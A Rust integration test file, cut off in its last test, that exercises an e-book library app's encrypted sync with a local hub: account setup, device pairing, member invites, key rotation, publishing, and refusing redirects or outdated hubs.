//! The instance's side of the hub end to end: a real hub on a loopback port and the
//! library's router. The library is put on the hub (My profile → Phone and reading
//! through the hub), pairs the owner's phone, invites members (Settings → Profiles)
//! whose devices redeem the invite through the API, publishes under the library key,
//! syncs every account with the library's token, changes the library key, and pulls
//! the accounts of 0.18–0.20 a last time.

mod common;

use std::sync::Arc;

use axum::http::{Method, StatusCode, header};
use base64::Engine as _;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use common::hub::{Lib, TestHub};
use shelfgauge::hub_client::keys::{self, AccountKey};
use shelfgauge::profiles::ProfileId;
use shelfgauge::publication::format::{BlobPath, Envelope, KeyHeader, Manifest};

/// Serves `router` on a loopback port.
async fn serve(router: axum::Router) -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(listener, router).await });
    port
}

/// The book key of a manifest blob, from its header, with the library key generations
/// a member's device holds.
fn book_key_of(manifest: &[u8], id: &str, generations: &[(u32, AccountKey)]) -> (u32, Vec<u8>) {
    let envelope = Envelope::parse(manifest).unwrap();
    let header = KeyHeader::decode(envelope.header).unwrap();
    let (_, key) = generations
        .iter()
        .find(|(key_id, _)| *key_id == header.key_id)
        .unwrap_or_else(|| panic!("no generation {}", header.key_id));
    let sealed = URL_SAFE_NO_PAD.decode(&header.book_key).unwrap();
    (
        header.key_id,
        keys::open_record(key, keys::BOOK_KEY_KIND, id, &sealed).unwrap(),
    )
}

#[tokio::test]
async fn without_a_hub_the_page_says_how_to_set_one() {
    let lib = Lib::new("", "Home");
    let page = lib.get("/profile/hub").await;
    assert_eq!(page.status, StatusCode::OK);
    assert!(page.body.contains("No hub set"), "{}", page.body);
    let reply = lib.post("/profile/hub", &[("action", "create")]).await;
    assert_eq!(reply.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(reply.body.contains("No hub is set"));
    let profile = lib.get("/profile").await;
    assert!(profile.body.contains("href=\"/profile/hub\""));
}

#[tokio::test]
async fn the_library_goes_on_the_hub_with_its_handle_and_owner() {
    let hub = TestHub::start().await;
    let lib = Lib::new(&hub.url, "Home library");
    let page = lib.get("/profile/hub").await;
    assert!(
        page.body.contains("Put the library on the hub"),
        "{}",
        page.body
    );
    assert!(
        page.body.contains("Hub invite code"),
        "the hub is invite-only"
    );
    assert!(
        page.body.contains("value=\"home-library\""),
        "a suggested handle"
    );
    assert_eq!(page.headers[header::CACHE_CONTROL], "no-store");

    let refused = lib
        .post(
            "/profile/hub",
            &[
                ("action", "create"),
                ("handle", "home"),
                ("owner_name", "admin"),
            ],
        )
        .await;
    assert_eq!(refused.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(refused.body.contains("invite code"), "{}", refused.body);
    let bad = lib
        .post(
            "/profile/hub",
            &[
                ("action", "create"),
                ("handle", "x"),
                ("owner_name", "admin"),
            ],
        )
        .await;
    assert!(bad.body.contains("3 to 32 characters"), "{}", bad.body);
    assert!(lib.account().is_none());

    lib.create_library(&hub.invite()).await;
    let library = lib.hub_library();
    assert_eq!(library.handle, "home");
    let owner = lib.account().unwrap();
    assert_eq!(owner.role, shelfgauge::hub_client::store::Role::Owner);
    assert_eq!(owner.name.as_deref(), Some("admin"));
    let page = lib.get("/profile/hub?done=created").await;
    assert!(page.body.contains("admin@home"), "{}", page.body);
    assert!(page.body.contains("Pair a phone"));
    let again = lib
        .post(
            "/profile/hub",
            &[
                ("action", "create"),
                ("handle", "other"),
                ("owner_name", "admin"),
            ],
        )
        .await;
    assert_eq!(again.status, StatusCode::UNPROCESSABLE_ENTITY);
    // The hub knows the library and its owner account.
    let summary = &hub.state.hub().libraries().unwrap()[0];
    assert_eq!(summary.usage.accounts, 1);

    // The owner's name and hub password, set on this computer.
    let renamed = lib
        .post("/profile/hub", &[("action", "name"), ("name", "Anna")])
        .await;
    assert_eq!(renamed.location(), "/profile/hub?done=renamed");
    let password = "Correct horse battery";
    let short = lib
        .post(
            "/profile/hub",
            &[
                ("action", "password"),
                ("password", "short"),
                ("repeat", "short"),
            ],
        )
        .await;
    assert_eq!(short.status, StatusCode::UNPROCESSABLE_ENTITY);
    let set = lib
        .post(
            "/profile/hub",
            &[
                ("action", "password"),
                ("password", password),
                ("repeat", password),
            ],
        )
        .await;
    assert_eq!(set.location(), "/profile/hub?done=password");
    // The hub reader signs in with the keys derived from it.
    let (status, prelogin) = hub
        .api(
            Method::POST,
            "prelogin",
            None,
            Some(serde_json::json!({ "address": "anna@home" })),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    let salt = URL_SAFE_NO_PAD
        .decode(prelogin["salt"].as_str().unwrap())
        .unwrap();
    let derived = shelfgauge_core::password::derive(password, &salt, 19456, 2).unwrap();
    let (status, signed_in) = hub
        .api(
            Method::POST,
            "login",
            None,
            Some(serde_json::json!({
                "address": "anna@home",
                "login_key": URL_SAFE_NO_PAD.encode(derived.login_key),
            })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{signed_in}");
    let (_, bundle) = hub
        .api(
            Method::GET,
            "bundle",
            Some(signed_in["token"].as_str().unwrap()),
            None,
        )
        .await;
    let sealed = URL_SAFE_NO_PAD
        .decode(bundle["bundle"].as_str().unwrap())
        .unwrap();
    let opened = keys::open_bundle(&AccountKey::new(derived.wrapping_key), &sealed).unwrap();
    assert_eq!(opened, lib.account().unwrap().key);
}

#[tokio::test]
async fn the_owners_phone_pairs_with_the_owner_key() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let phone = lib.phone(&hub).await;
    assert_eq!(phone.key, lib.account().unwrap().key);
    let page = lib.get("/profile/hub").await;
    assert!(page.body.contains("Remove"), "{}", page.body);
    let removed = lib
        .post(
            "/profile/hub",
            &[("action", "remove"), ("device", &phone.device.to_string())],
        )
        .await;
    assert_eq!(removed.location(), "/profile/hub?done=removed");
    let (status, _) = hub.api(Method::GET, "sync", Some(&phone.token), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn an_invited_member_opens_the_librarys_books_by_their_links() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let id = lib.shelf()[0].publication.unwrap().to_string();

    let (grandma, secret, one_time) = lib.invite_someone(&hub, "Grandma").await;
    // Not in the picker: one profile is still read on this computer.
    assert_eq!(lib.get("/").await.status, StatusCode::OK);
    let settings = lib.get("/settings").await;
    assert!(
        settings.body.contains("Invited, until"),
        "{}",
        settings.body
    );
    let member = hub.redeem(&secret, &one_time, "grandma").await;
    assert_eq!(member.payload.profile_name, "Grandma");
    assert_eq!(member.payload.library_name, "Home library");
    assert_eq!(member.payload.library_key.key_id, 1);

    // The member's device opens the book by its link alone: the book key is in the
    // manifest's header under the library key from the invite.
    let library_key = AccountKey::new(
        URL_SAFE_NO_PAD
            .decode(&member.payload.library_key.key)
            .unwrap()
            .try_into()
            .unwrap(),
    );
    let (status, manifest) = hub.blob(&member.token, &id, "manifest").await;
    assert_eq!(status, StatusCode::OK);
    let (key_id, book_key) = book_key_of(&manifest, &id, &[(1, library_key)]);
    assert_eq!(key_id, 1);
    let book_key = shelfgauge::publication::BookKey::new(book_key.try_into().unwrap());
    let plain = shelfgauge::publication::open(
        &id.parse().unwrap(),
        &book_key,
        BlobPath::Manifest,
        &manifest,
        1 << 26,
    )
    .unwrap();
    assert_eq!(
        Manifest::decode(&plain).unwrap().title,
        lib.shelf()[0].title
    );

    // The library learns of the account at its next sync and hands it the key.
    lib.sync().await;
    let account = lib.account_of(ProfileId(grandma)).unwrap();
    assert_eq!(account.name.as_deref(), Some("grandma"));
    assert_eq!(account.account.unwrap().to_string(), member.account);
    assert_eq!(account.keys_sent, 1);
    let settings = lib.get("/settings").await;
    assert!(settings.body.contains("grandma@home"), "{}", settings.body);
    let records = hub.records(&member.token).await;
    let key_record = records
        .iter()
        .find(|(kind, _, _)| kind == "library_key")
        .unwrap();
    let member_key = AccountKey::new(
        URL_SAFE_NO_PAD
            .decode(&member.payload.account_key)
            .unwrap()
            .try_into()
            .unwrap(),
    );
    let plain = keys::open_record(
        &member_key,
        "library_key",
        "k1",
        key_record.2.as_ref().unwrap(),
    )
    .unwrap();
    let value: serde_json::Value = serde_json::from_slice(&plain).unwrap();
    assert_eq!(value["key_id"], 1);

    // A `profile` record of the member renames the profile here.
    let profile = serde_json::json!({ "display_name": "Babushka", "color": 3, "updated_at": 1 });
    let sealed = keys::seal_record(
        &member_key,
        "profile",
        "profile",
        &serde_json::to_vec(&profile).unwrap(),
    )
    .unwrap();
    let (status, _) = hub
        .api(
            Method::POST,
            "sync",
            Some(&member.token),
            Some(serde_json::json!({ "records": [
                { "kind": "profile", "id": "profile", "data": URL_SAFE_NO_PAD.encode(sealed) }
            ] })),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    // An admin's Sync now syncs every account of the library.
    lib.sync().await;
    let name: String = lib.value(&format!("SELECT name FROM profiles WHERE id = {grandma}"));
    assert_eq!(name, "Babushka");
}

#[tokio::test]
async fn a_new_library_key_reaches_the_members_and_old_books_still_open() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let old = lib.shelf()[0].publication.unwrap().to_string();
    let (_, secret, one_time) = lib.invite_someone(&hub, "Ivan").await;
    let ivan = hub.redeem(&secret, &one_time, "ivan").await;
    let (anna_id, secret, one_time) = lib.invite_someone(&hub, "Anna").await;
    let anna = hub.redeem(&secret, &one_time, "anna").await;
    lib.sync().await;

    let rotated = lib.post("/profile/hub", &[("action", "rotate")]).await;
    assert_eq!(rotated.location(), "/profile/hub?done=rotated");
    // Anna is removed before the next sync: she never gets the new generation.
    let deleted = lib
        .post(
            &format!("/settings/profiles/{anna_id}/delete"),
            &[("name", "Anna")],
        )
        .await;
    assert_eq!(deleted.status, StatusCode::SEE_OTHER);
    let (status, _) = hub.api(Method::GET, "sync", Some(&anna.token), None).await;
    assert_eq!(
        status,
        StatusCode::UNAUTHORIZED,
        "her account is gone from the hub"
    );
    // Off the shelf and on it again: a new publication under generation 2.
    assert_eq!(lib.shelf_action(book, "remove").await, "removed");
    assert_eq!(lib.publish(book).await, "published");
    let new = lib.shelf()[0].publication.unwrap().to_string();
    lib.sync().await;

    let generations = shelfgauge::hub_client::store::library_keys(&lib.userdata.lock()).unwrap();
    assert_eq!(generations.len(), 2);
    let (_, manifest) = hub.blob(&ivan.token, &new, "manifest").await;
    assert_eq!(book_key_of(&manifest, &new, &generations).0, 2);
    // Ivan got generation 2 as a record.
    let ids: Vec<String> = hub
        .records(&ivan.token)
        .await
        .into_iter()
        .filter(|(kind, _, _)| kind == "library_key")
        .map(|(_, id, _)| id)
        .collect();
    assert_eq!(ids, ["k1", "k2"]);
    // A book made before the change opens with generation 1 (the hub deleted it, so
    // check the header of the publication made before: still generation 1).
    let _ = old;
}

#[tokio::test]
async fn a_reset_link_gives_a_member_a_new_password() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let (id, secret, one_time) = lib.invite_someone(&hub, "Olga").await;
    let olga = hub.redeem(&secret, &one_time, "olga").await;
    // Before the library saw the account: no reset yet.
    let early = lib
        .post(&format!("/settings/profiles/{id}/reset"), &[])
        .await;
    assert_eq!(early.status, StatusCode::SEE_OTHER);
    assert!(early.location().contains("hub-no-account"));
    lib.sync().await;
    let (secret, one_time) = lib.invite_link(&hub, id, "reset").await;
    let (_, preview) = hub
        .api(
            Method::POST,
            "invites/preview",
            None,
            Some(serde_json::json!({ "secret": secret })),
        )
        .await;
    assert_eq!(preview["kind"], "reset");
    assert_eq!(preview["name"], "olga");
    let payload = keys::open_invite(
        &one_time,
        &URL_SAFE_NO_PAD
            .decode(preview["payload"].as_str().unwrap())
            .unwrap(),
    )
    .unwrap();
    assert_eq!(
        payload.account_key, olga.payload.account_key,
        "the same account"
    );
    // Sign out all devices: the old device goes.
    let out = lib
        .post(&format!("/settings/profiles/{id}/sign-out"), &[])
        .await;
    assert!(out.location().contains("signed-out"), "{}", out.location());
    let (status, _) = hub.api(Method::GET, "sync", Some(&olga.token), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn an_older_hub_is_refused_by_its_version() {
    use axum::routing::get;
    let port = serve(axum::Router::new().route(
        "/api/info",
        get(|| async {
            axum::Json(serde_json::json!({
                "service": "shelfgauge-hub",
                "version": "0.19.0",
                "formats": { "min": 1, "max": 1 },
                "registration": "open",
                "limits": {
                    "max_blob_bytes": 1024, "max_record_bytes": 1024,
                    "max_sync_records": 10, "publication_expiry_days": 0
                },
            }))
        }),
    ))
    .await;
    let lib = Lib::new(&format!("http://127.0.0.1:{port}"), "Home");
    let page = lib.get("/profile/hub").await;
    assert!(
        page.body.contains("runs shelfgauge 0.19.0"),
        "{}",
        page.body
    );
    let reply = lib
        .post(
            "/profile/hub",
            &[
                ("action", "create"),
                ("handle", "home"),
                ("owner_name", "admin"),
            ],
        )
        .await;
    assert_eq!(reply.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(reply.body.contains("runs shelfgauge 0.19.0"));
    assert!(lib.account().is_none());
}

#[tokio::test]
async fn old_accounts_are_pulled_a_last_time_and_forgotten() {
    use axum::routing::get;
    use shelfgauge::hub_client::store;
    use shelfgauge::hub_client::sync::{Report, pull_legacy};

    // A 0.20 hub: its device token pulls the account's records.
    let key = AccountKey::new([6; 32]);
    let content: Vec<u8> = vec![1, 2, 3];
    let annotation = serde_json::json!({
        "id": "0f8fad5b-d9cb-469f-a165-70867728950e", "content_key": URL_SAFE_NO_PAD.encode(&content),
        "start_block": 2, "start_offset": 0, "end_block": 2, "end_offset": 0, "text": "",
        "prefix": "", "suffix": "s", "section_title": null, "note": "made on a phone",
        "book_title": "T", "book_authors": "A", "created_at": 1, "updated_at": 5,
        "deleted_at": null,
    });
    let sealed = keys::seal_record(
        &key,
        "annotation",
        "0f8fad5b-d9cb-469f-a165-70867728950e",
        &serde_json::to_vec(&annotation).unwrap(),
    )
    .unwrap();
    let body = serde_json::json!({
        "records": [
            { "kind": "annotation", "id": "0f8fad5b-d9cb-469f-a165-70867728950e",
              "seq": 7, "data": URL_SAFE_NO_PAD.encode(sealed), "updated_at": 5 },
            { "kind": "shelf_item", "id": "x", "seq": 8, "data": "AAAA", "updated_at": 5 },
        ],
        "seq": 8, "more": false,
    });
    let port = serve(axum::Router::new().route(
        "/api/sync",
        get(move |headers: axum::http::HeaderMap| {
            let body = body.clone();
            async move {
                if headers[header::AUTHORIZATION] == "Bearer old-token" {
                    (StatusCode::OK, axum::Json(body))
                } else {
                    (
                        StatusCode::UNAUTHORIZED,
                        axum::Json(serde_json::json!({ "error": "unauthorized", "message": "" })),
                    )
                }
            }
        }),
    ))
    .await;
    let lib = Lib::new("", "Home");
    lib.sql(&format!(
        "INSERT INTO hub_legacy_accounts (profile_id, hub_url, account_key, device_token, last_seq)
         VALUES (1, 'http://127.0.0.1:{port}', X'{}', 'old-token', 0)",
        "06".repeat(32)
    ));
    let legacy = store::legacy_accounts(&lib.userdata.lock()).unwrap();
    assert_eq!(legacy.len(), 1);
    let userdata = Arc::clone(&lib.userdata);
    let done = tokio::task::spawn_blocking(move || {
        let mut report = Report::default();
        let done = pull_legacy(&userdata, &legacy[0], &|_| None, "Home", &mut report).unwrap();
        (done, report.merged)
    })
    .await
    .unwrap();
    assert_eq!(
        done,
        (true, 1),
        "the annotation merged, the shelf item skipped"
    );
    let note: String = lib.value("SELECT note FROM annotations");
    assert_eq!(note, "made on a phone");
    assert!(
        store::legacy_accounts(&lib.userdata.lock())
            .unwrap()
            .is_empty()
    );

    // A token the old hub no longer knows: forgotten without a pull.
    lib.sql(&format!(
        "INSERT INTO hub_legacy_accounts (profile_id, hub_url, account_key, device_token, last_seq)
         VALUES (1, 'http://127.0.0.1:{port}', X'{}', 'revoked', 0)",
        "06".repeat(32)
    ));
    let legacy = store::legacy_accounts(&lib.userdata.lock()).unwrap();
    let userdata = Arc::clone(&lib.userdata);
    let done = tokio::task::spawn_blocking(move || {
        pull_legacy(
            &userdata,
            &legacy[0],
            &|_| None,
            "Home",
            &mut Report::default(),
        )
        .unwrap()
    })
    .await
    .unwrap();
    assert!(done);
    assert!(
        store::legacy_accounts(&lib.userdata.lock())
            .unwrap()
            .is_empty()
    );
}

#[tokio::test]
async fn an_unreachable_hub_is_reported_on_the_page() {
    // A port nobody listens on.
    let port = std::net::TcpListener::bind("127.0.0.1:0")
        .unwrap()
        .local_addr()
        .unwrap()
        .port();
    let lib = Lib::new(&format!("http://127.0.0.1:{port}"), "Home");
    let page = lib.get("/profile/hub").await;
    assert_eq!(page.status, StatusCode::OK);
    assert!(page.body.contains("cannot be reached"), "{}", page.body);
    let reply = lib
        .post(
            "/profile/hub",
            &[
                ("action", "create"),
                ("handle", "home"),
                ("owner_name", "admin"),
            ],
        )
        .await;
    assert_eq!(reply.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(reply.body.contains("cannot be reached"));
}

#[tokio::test]
async fn redirects_are_never_followed() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    use axum::routing::get;
    use shelfgauge::hub::Secret;
    use shelfgauge::hub_client::{ClientError, HubClient, HubUrl};

    let hits = Arc::new(AtomicUsize::new(0));
    let counted = Arc::clone(&hits);
    let target = serve(axum::Router::new().route(
        "/api/library/owner/devices",
        get(move || {
            counted.fetch_add(1, Ordering::Relaxed);
            async { axum::Json(serde_json::json!({ "devices": [] })) }
        }),
    ))
    .await;
    let location = format!("http://127.0.0.1:{target}/api/library/owner/devices");
    let redirecting = serve(axum::Router::new().route(
        "/api/library/owner/devices",
        get(move || async move { (StatusCode::FOUND, [(header::LOCATION, location.clone())]) }),
    ))
    .await;

    let url = HubUrl::parse(&format!("http://127.0.0.1:{redirecting}")).unwrap();
    let result = tokio::task::spawn_blocking(move || {
        HubClient::new(url).owner_devices(&Secret::from_text("token"))
    })
    .await
    .unwrap();
    match result {
        Err(ClientError::Unreachable(text)) => assert!(text.contains("redirects"), "{text}"),
        other => panic!("{other:?}"),
    }
    assert_eq!(hits.load(Ordering::Relaxed), 0);
}

/// The JSON plaintext of a pushed record.
fn opened(key: &AccountKey, kind: &str, id: &str, data: &Option<Vec<u8>>) -> serde_json::Value {
    let data = data.as_ref().expect("a record, not a deletion");
    serde_json::from_slice(&keys::open_record(key, kind, id, data).unwrap()).unwrap()
}

#[tokio::test]
async fn open_on_phone_publishes_the_book_with_its_marks() {
    use shelfgauge::hub_client::store::ShelfState;
    use shelfgauge::publication::format::{BlobPath, Manifest};

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let mark = lib
        .json(
            &format!("/book/{book}/annotations"),
            serde_json::json!({ "block": "b2" }),
        )
        .await;
    assert_eq!(mark.status, StatusCode::CREATED, "{}", mark.body);
    let mark: serde_json::Value = serde_json::from_str(&mark.body).unwrap();
    let mark = mark["id"].as_str().unwrap().to_owned();
    let position = lib
        .json(
            &format!("/book/{book}/position"),
            serde_json::json!({ "block": "b3" }),
        )
        .await;
    assert_eq!(position.status, StatusCode::NO_CONTENT);
    // Not on the shelf yet: nothing is queued.
    assert_eq!(lib.outbox(), 0);
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(card.body.contains("Read on phone"), "{}", card.body);

    assert_eq!(lib.publish(book).await, "published");
    let shelf = lib.shelf();
    assert_eq!(shelf.len(), 1);
    let entry = &shelf[0];
    assert_eq!(entry.state, ShelfState::Published);
    assert!(entry.own);
    assert_eq!(entry.instance, "Home library");
    let id = entry.publication.unwrap();
    let book_key = entry.book_key.clone().unwrap();
    assert_eq!(lib.outbox(), 0, "everything was pushed");

    let card = lib.get(&format!("/book/{book}?hub=published")).await;
    assert!(card.body.contains("The book is on the hub"));
    assert!(card.body.contains("Delete for everyone"));
    assert!(card.body.contains(&format!("{}/r/{id}", hub.url)));

    // A device opens the manifest with the book key from the shelf item.
    let account = lib.account().unwrap();
    let phone = lib.phone(&hub).await;
    let token = phone.token.as_str();
    let (status, blob) = hub.blob(token, &id.to_string(), "manifest").await;
    assert_eq!(status, StatusCode::OK);
    let plain =
        shelfgauge::publication::open(&id, &book_key, BlobPath::Manifest, &blob, 1 << 26).unwrap();
    let manifest = Manifest::decode(&plain).unwrap();
    assert_eq!(manifest.content_key, entry.content_key);
    for n in 0..manifest.parts.len() {
        let (status, _) = hub.blob(token, &id.to_string(), &format!("p/{n}")).await;
        assert_eq!(status, StatusCode::OK);
    }

    let records = hub.records(token).await;
    let kinds: Vec<&str> = records.iter().map(|(k, _, _)| k.as_str()).collect();
    assert_eq!(kinds.len(), 3, "{kinds:?}");
    for (kind, record_id, data) in &records {
        let value = opened(&account.key, kind, record_id, data);
        match kind.as_str() {
            "shelf_item" => {
                assert_eq!(value["publication"], id.to_string());
                assert_eq!(
                    value["book_key"],
                    URL_SAFE_NO_PAD.encode(book_key.as_bytes())
                );
                assert_eq!(value["instance"], "Home library");
                assert_eq!(value["format_version"], 2);
            }
            "annotation" => {
                assert_eq!(record_id, &mark);
                assert_eq!(value["start_block"], 2);
                assert_eq!(value["deleted_at"], serde_json::Value::Null);
            }
            "position" => assert_eq!(value["block"], 3),
            other => panic!("{other}"),
        }
        assert!(value["content_key"].as_str().is_some(), "{kind}: {value}");
    }
}

#[tokio::test]
async fn changes_of_shelf_books_are_queued_and_pushed() {
    use shelfgauge::hub_client::{HubClient, HubUrl, sync};

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let mark = lib
        .json(
            &format!("/book/{book}/annotations"),
            serde_json::json!({ "block": "b4" }),
        )
        .await;
    let mark: serde_json::Value = serde_json::from_str(&mark.body).unwrap();
    let mark = mark["id"].as_str().unwrap().to_owned();
    assert_eq!(lib.outbox(), 1);

    let account = lib.account().unwrap();
    let userdata = std::sync::Arc::clone(&lib.userdata);
    let url = HubUrl::parse(&hub.url).unwrap();
    let pushed = tokio::task::spawn_blocking({
        let account = account.clone();
        let library = lib.hub_library();
        move || {
            let target = sync::Target::of(&library, &account).unwrap();
            sync::push(&userdata, target, &account, &HubClient::new(url))
        }
    })
    .await
    .unwrap()
    .unwrap();
    assert_eq!(pushed, 1);
    assert_eq!(lib.outbox(), 0);
    let phone = lib.phone(&hub).await;
    let records = hub.records(&phone.token).await;
    assert!(
        records
            .iter()
            .any(|(k, id, d)| k == "annotation" && *id == mark && d.is_some())
    );
}

#[tokio::test]
async fn removing_from_the_shelf_deletes_the_copy_and_the_records() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    lib.json(
        &format!("/book/{book}/annotations"),
        serde_json::json!({ "block": "b2" }),
    )
    .await;
    assert_eq!(lib.publish(book).await, "published");
    let id = lib.shelf()[0].publication.unwrap().to_string();
    let token = lib.phone(&hub).await.token;

    assert_eq!(lib.shelf_action(book, "remove").await, "removed");
    assert!(lib.shelf().is_empty());
    assert_eq!(lib.outbox(), 0);
    let (status, _) = hub.blob(token.as_str(), &id, "manifest").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let records = hub.records(token.as_str()).await;
    assert_eq!(records.len(), 2, "shelf item and annotation");
    assert!(
        records.iter().all(|(_, _, data)| data.is_none()),
        "all deleted"
    );

    // The bookmark stays in this library; the book can go on the shelf again.
    let card = lib.get(&format!("/book/{book}?hub=removed")).await;
    assert!(card.body.contains("Bookmarks (1)"), "{}", card.body);
    assert!(card.body.contains("Read on phone"));
    assert!(card.body.contains("The book is deleted on the hub"));
}

#[tokio::test]
async fn removing_while_the_hub_is_down_waits_for_the_next_sync() {
    use shelfgauge::hub_client::store::ShelfState;

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    hub.stop().await;

    assert_eq!(lib.shelf_action(book, "remove").await, "removing");
    let shelf = lib.shelf();
    assert_eq!(shelf[0].state, ShelfState::Removing);
    assert_eq!(lib.outbox(), 1, "the shelf item's deletion waits");
    let card = lib.get(&format!("/book/{book}?hub=removing")).await;
    assert!(card.body.contains("Being taken off your shelf"));
    assert!(card.body.contains("could not be reached"));
    assert_eq!(lib.publish(book).await, "unreachable");
}

#[tokio::test]
async fn expired_publications_can_be_published_again() {
    use shelfgauge::hub_client::store::ShelfState;

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let old = lib.shelf()[0].clone();
    let token = lib.hub_library().token.as_str().to_owned();
    // As the hub's expiry does.
    let id = old.publication.unwrap().to_string();
    let (status, _) = hub
        .api(
            Method::DELETE,
            &format!("pub/{id}"),
            Some(token.as_str()),
            None,
        )
        .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    lib.sync().await;
    assert_eq!(lib.shelf()[0].state, ShelfState::Expired);
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(card.body.contains("Publish again"), "{}", card.body);

    assert_eq!(lib.publish(book).await, "published");
    let new = lib.shelf()[0].clone();
    assert_eq!(new.state, ShelfState::Published);
    assert_ne!(new.publication, old.publication);
    assert_ne!(new.book_key, old.book_key, "a book key is never reused");
    let (_, list) = hub
        .api(Method::GET, "pub", Some(token.as_str()), None)
        .await;
    assert_eq!(list["publications"].as_array().unwrap().len(), 1);
}

#[tokio::test]
async fn drm_books_never_go_on_the_shelf() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("locked.epub");
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(
        card.body.contains("never leave this library"),
        "{}",
        card.body
    );
    assert!(!card.body.contains("Read on phone"));
    assert_eq!(lib.publish(book).await, "protected");
    assert!(lib.shelf().is_empty());
    let token = lib.phone(&hub).await.token;
    let (_, list) = hub
        .api(Method::GET, "pub", Some(token.as_str()), None)
        .await;
    assert!(list["publications"].as_array().unwrap().is_empty());
}

#[tokio::test]
async fn a_refused_upload_leaves_nothing_behind() {
    let hub = TestHub::start_with(|config| config.quotas.max_bytes = 1000).await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "quota");
    assert!(lib.shelf().is_empty());
    let token = lib.phone(&hub).await.token;
    let (_, list) = hub
        .api(Method::GET, "pub", Some(token.as_str()), None)
        .await;
    assert!(list["publications"].as_array().unwrap().is_empty());
    let card = lib.get(&format!("/book/{book}?hub=quota")).await;
    assert!(card.body.contains("quota is used up"));
}

#[tokio::test]
async fn without_a_hub_account_the_card_has_no_shelf() {
    let lib = Lib::new("", "Home");
    let book = lib.book("book.txt");
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(!card.body.contains("On your phone"));
    let reply = lib
        .post(&format!("/book/{book}/hub"), &[("action", "publish")])
        .await;
    assert_eq!(reply.status, StatusCode::BAD_REQUEST);
}

/// Regression: a book removed from the library (a rescan with its drive unmounted)
/// must not delete its marks on the devices, even when changes were still queued.
#[tokio::test]
async fn a_book_removed_from_the_library_keeps_its_records_on_the_hub() {
    use shelfgauge::hub_client::{HubClient, HubUrl, sync};

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let mark = lib
        .json(
            &format!("/book/{book}/annotations"),
            serde_json::json!({ "block": "b2" }),
        )
        .await;
    let mark: serde_json::Value = serde_json::from_str(&mark.body).unwrap();
    let mark = mark["id"].as_str().unwrap().to_owned();
    lib.json(
        &format!("/book/{book}/position"),
        serde_json::json!({ "block": "b3" }),
    )
    .await;
    assert_eq!(lib.publish(book).await, "published");

    // Changes queued, not pushed yet.
    let note = lib
        .json(
            &format!("/annotation/{mark}/note"),
            serde_json::json!({ "note": "queued" }),
        )
        .await;
    assert_eq!(note.status, StatusCode::OK, "{}", note.body);
    lib.json(
        &format!("/book/{book}/position"),
        serde_json::json!({ "block": "b4" }),
    )
    .await;
    assert_eq!(lib.outbox(), 2);
    {
        let conn = lib.userdata.lock();
        conn.execute(
            "UPDATE annotations SET deleted_at = 1, deleted_reason = 'book_removed'",
            [],
        )
        .unwrap();
        conn.execute(
            "UPDATE reading_positions SET deleted_at = 1, deleted_reason = 'book_removed'",
            [],
        )
        .unwrap();
    }

    let account = lib.account().unwrap();
    let phone = lib.phone(&hub).await;
    let push = |account: shelfgauge::hub_client::store::HubAccount| {
        let userdata = std::sync::Arc::clone(&lib.userdata);
        let url = HubUrl::parse(&hub.url).unwrap();
        let library = lib.hub_library();
        tokio::task::spawn_blocking(move || {
            let target = sync::Target::of(&library, &account).unwrap();
            sync::push(&userdata, target, &account, &HubClient::new(url)).unwrap()
        })
    };
    assert_eq!(push(account.clone()).await.unwrap(), 0, "nothing to push");
    assert_eq!(lib.outbox(), 0);
    let records = hub.records(&phone.token).await;
    assert_eq!(records.len(), 3);
    assert!(
        records.iter().all(|(_, _, data)| data.is_some()),
        "{records:?}"
    );

    // Taking the book off the shelf deletes them all, also those of the removed book.
    assert_eq!(lib.shelf_action(book, "remove").await, "removed");
    let records = hub.records(&phone.token).await;
    assert!(
        records.iter().all(|(_, _, data)| data.is_none()),
        "{records:?}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_double_click_on_open_on_phone_uploads_once() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let (a, b) = tokio::join!(lib.publish(book), lib.publish(book));
    let mut codes = [a, b];
    codes.sort();
    assert!(
        codes == ["busy", "published"] || codes == ["published", "published"],
        "{codes:?}"
    );
